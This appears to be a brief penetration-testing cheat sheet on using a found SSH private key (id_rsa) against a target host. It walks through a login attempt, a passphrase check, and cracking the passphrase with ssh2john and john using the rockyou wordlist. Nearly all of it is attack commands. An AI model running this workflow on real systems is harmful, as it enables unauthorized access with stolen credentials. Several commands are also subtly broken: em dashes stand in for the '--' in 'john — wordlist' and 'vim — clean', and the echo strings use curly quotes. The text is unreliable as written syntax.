# SSH Private Keys (id_rsa)

### 1) Quick SSH test (30–60s)

    ssh -i id_rsa user@TARGET -p PORT -o IdentitiesOnly=yes -o BatchMode=yes -vvv

### 2) If SSH says key needs a passphrase or is rejected: — Then Check whether if key is passphrase-protected:

    ssh-keygen -y -f id_rsa >/dev/null && echo “no passphrase” || echo “passphrase-protected or invalid”

### 3) If passphrase-protected — quick crack workflow

- Convert key to hash:

      ssh2john.py id_rsa > hash.txt

- Crack with john:

      john — wordlist=rockyou.txt hash.txt

### 4) Common Libcrypto/format errors

If ssh complains about libcrypto or key format, normalize the file:

    dos2unix ~/.ssh/id_rsa
    vim — clean ~/.ssh/id_rsa
    (inside vim: type :wq then hit Return)
